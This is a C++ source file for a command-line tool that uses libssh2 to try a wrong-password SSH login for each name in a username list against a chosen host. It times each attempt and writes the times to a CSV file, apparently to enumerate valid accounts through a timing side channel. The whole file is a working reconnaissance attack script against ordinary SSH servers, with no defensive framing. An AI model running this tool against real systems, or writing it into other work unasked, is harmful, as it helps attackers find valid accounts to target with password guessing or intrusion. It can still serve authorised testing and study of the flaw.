#include <libssh2.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <iostream>
#include <chrono>
#include <fstream>
#include <vector>
#include <string>

using namespace std;
using namespace chrono;

double try_ssh_login(const string& ip, int port, const string& username, const string& password = "wrongpass") {
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &sin.sin_addr);

    auto start = high_resolution_clock::now();

    if (connect(sock, (sockaddr*)&sin, sizeof(sin)) != 0) {
        cerr << "[-] Connection failed to " << ip << endl;
        return -1;
    }

    LIBSSH2_SESSION* session = libssh2_session_init();
    libssh2_session_handshake(session, sock);

    int rc = libssh2_userauth_password(session, username.c_str(), password.c_str());

    libssh2_session_disconnect(session, "Bye");
    libssh2_session_free(session);
    close(sock);

    auto end = high_resolution_clock::now();
    duration<double> elapsed = end - start;

    return elapsed.count();
}

vector<string> load_usernames(const string& path) {
    ifstream file(path);
    vector<string> usernames;
    string line;
    while (getline(file, line)) {
        if (!line.empty())
            usernames.push_back(line);
    }
    return usernames;
}

int main(int argc, char* argv[]) {

    std::string ip;
    int port=22;
    std::string userfile;
    
    if (argc == 1){
        std::cerr<<"Use -h for help\n"<<std::endl;
        return(1);
    }

    for(int i= 1; i < argc;++i){
        std::string arg = argv[i];
        if (arg == "-i" && i+1 < argc)
            ip = argv[++i];
        else if (arg == "-p" && i+1 < argc)
            port = stoi(argv[++i]);
        else if (arg == "-u" && i+1 < argc)
            userfile = argv[++i];
        else if (arg == "-h" || arg == "--help"){
            std::cout<<"Usage:\n"
                     <<"ssh_search -i<IP> -p<PORT> -u<USERFILE>\n";
            return 0;
        }else{
            std::cerr<<"Unkown option: "<<arg<<" \nUse -h for help"<<std::endl;
            return(1);
         }
    }


    libssh2_init(0);

    auto usernames = load_usernames(userfile);
    ofstream out("timings.csv");
    out << "Username,ResponseTime\n";

    for (const string& user : usernames) {
        double t = try_ssh_login(ip, port, user);
        if (t > 0) {
            cout << "[+] User: " << user << " -> Time: " << t << " sec" << endl;
            out << user << "," << t << endl;
        }
    }

    out.close();
    libssh2_exit();

    return 0;
}
